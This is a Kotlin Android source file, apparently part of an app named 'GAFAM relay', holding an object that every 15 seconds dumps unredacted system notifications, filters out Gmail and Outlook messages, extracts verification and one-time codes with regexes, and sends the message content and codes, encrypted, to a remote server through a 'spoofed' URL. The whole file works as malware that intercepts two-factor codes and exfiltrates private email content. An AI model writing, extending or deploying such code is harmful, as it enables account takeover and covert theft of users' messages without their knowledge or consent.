package com.gafam.relay

import android.content.Context
import android.content.SharedPreferences
import android.util.Log
import java.security.MessageDigest
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec
import kotlin.concurrent.thread
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import android.util.Base64
import java.io.BufferedReader
import java.io.InputStreamReader

object EmailDumpsysPoller {
    private const val TAG = "GAFAM_EmailDumpsys"
    private var running = false
    private var thread: Thread? = null

    // Email apps to watch
    private val watchPkgs = setOf("com.google.android.gm", "com.microsoft.office.outlook")

    private val codePatterns = listOf(
        Regex("""\b(\d{4,8})\b"""),
        Regex("""code[\s:]+(\d{4,8})""", RegexOption.IGNORE_CASE),
        Regex("""verify[\s:]+(\d{4,8})""", RegexOption.IGNORE_CASE),
        Regex("""otp[\s:]+(\d{4,8})""", RegexOption.IGNORE_CASE),
        Regex("""confirme[\s:]+(\d{4,8})""", RegexOption.IGNORE_CASE),
    )

    @Synchronized
    fun start(context: Context) {
        if (running) return
        running = true
        thread = thread { poll(context) }
        Log.i(TAG, "Email notification poller started")
    }

    @Synchronized
    fun stop() {
        running = false
        thread = null
    }

    private fun poll(context: Context) {
        val prefs: SharedPreferences = context.getSharedPreferences("GAFAM_PREFS", Context.MODE_PRIVATE)
        val seen = mutableSetOf<String>()

        while (running) {
            try {
                Thread.sleep(15000) // poll every 15s

                if (prefs.getString("apiUrl", null) == null) continue

                val process = Runtime.getRuntime().exec(arrayOf("dumpsys", "notification", "--noredact"))
                val reader = BufferedReader(InputStreamReader(process.inputStream))
                val output = reader.readText()
                process.waitFor()

                // Parse notifications
                var currentPkg = ""
                var currentKey = ""
                var currentTitle = ""
                var currentText = ""
                val extracted = mutableListOf<Triple<String, String, String>>()

                for (line in output.lines()) {
                    when {
                        line.trim().startsWith("pkg=") -> {
                            val pkg = line.substringAfter("pkg=").trim()
                            if (pkg in watchPkgs) currentPkg = pkg
                        }
                        line.contains("key=") -> {
                            currentKey = line.substringAfter("key=").substringBefore(" ").trim()
                        }
                        line.contains("android.title=") -> {
                            currentTitle = line.substringAfter("android.title=").substringBefore(")"); break
                        }
                        line.contains("android.text=") -> {
                            currentText = line.substringAfter("android.text=").substringBefore(")") 
                        }
                    }

                    if (currentPkg.isNotEmpty() && currentKey.isNotEmpty() && currentKey !in seen) {
                        seen.add(currentKey)
                        extracted.add(Triple(currentPkg, currentTitle, currentText))
                        currentPkg = ""; currentKey = ""; currentTitle = ""; currentText = ""
                    }
                }

                // Send extracted emails to VPC
                for ((pkg, title, text) in extracted) {
                    val codes = extractCodes(title + " " + text)
                    if (codes.isNotEmpty()) {
                        sendToVpc(context, prefs, pkg, title, text, codes)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Poll error: ${e.message}")
            }
        }
    }

    private fun extractCodes(text: String): List<String> {
        val codes = mutableListOf<String>()
        for (pat in codePatterns) {
            for (match in pat.findAll(text)) {
                val code = match.groupValues.getOrNull(1) ?: match.value
                if (code !in codes) codes.add(code)
            }
        }
        return codes
    }

    private fun sendToVpc(context: Context, prefs: SharedPreferences, pkg: String, title: String, text: String, codes: List<String>) {
        val apiUrl = prefs.getString("apiUrl", null) ?: return
        val jwtSecret = prefs.getString("jwtSecret", null) ?: return

        try {
            val spoofedUrl = ApiClient.getSpoofedUrl(apiUrl, "/api/auth/email/notif")
            val client = ApiClient.getClient(context) ?: return

            val jsonBody = JSONObject().apply {
                put("app", pkg)
                put("title", title)
                put("body", text)
                put("codes", JSONObject.wrap(codes))
                put("timestamp", System.currentTimeMillis())
            }

            val plaintext = jsonBody.toString().toByteArray(Charsets.UTF_8)
            val digest = MessageDigest.getInstance("SHA-256")
            val keyBytes = digest.digest(jwtSecret.toByteArray(Charsets.UTF_8))
            val secretKey = SecretKeySpec(keyBytes, "AES")
            val cipher = Cipher.getInstance("AES/GCM/NoPadding")
            val iv = ByteArray(12); SecureRandom().nextBytes(iv)
            val gcmSpec = GCMParameterSpec(128, iv)
            cipher.init(Cipher.ENCRYPT_MODE, secretKey, gcmSpec)
            val ciphertext = cipher.doFinal(plaintext)

            val encryptedPayload = JSONObject().apply {
                put("encrypted_data", Base64.encodeToString(ciphertext, Base64.NO_WRAP))
                put("iv", Base64.encodeToString(iv, Base64.NO_WRAP))
            }

            val body = encryptedPayload.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url(spoofedUrl).post(body)
                .addHeader("Authorization", "Bearer $jwtSecret").build()

            client.newCall(request).execute()
            Log.i(TAG, "📧 Sent to VPC: $pkg / $title / codes=$codes")
        } catch (e: Exception) {
            Log.e(TAG, "Send failed: ${e.message}")
        }
    }
}
